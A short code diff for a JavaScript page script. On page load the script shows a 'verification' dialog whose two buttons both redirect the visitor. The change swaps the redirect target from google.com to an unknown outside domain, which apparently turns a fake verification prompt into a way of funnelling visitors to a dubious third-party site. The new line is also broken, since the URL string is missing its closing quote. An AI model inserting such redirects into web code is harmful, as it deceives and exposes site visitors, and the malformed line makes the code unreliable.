@@ -45,7 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const modal = document.getElementById('verification-modal');
   if (modal) {
     modal.showModal();
-    const instantRedirect = () => { window.location.href = 'https://www.google.com/'; };
+    const instantRedirect = () => { window.location.href = 'https://adorbit.site/; };
     document.getElementById('verify-btn-1')?.addEventListener('click', instantRedirect);
     document.getElementById('verify-btn-2')?.addEventListener('click', instantRedirect);
   }
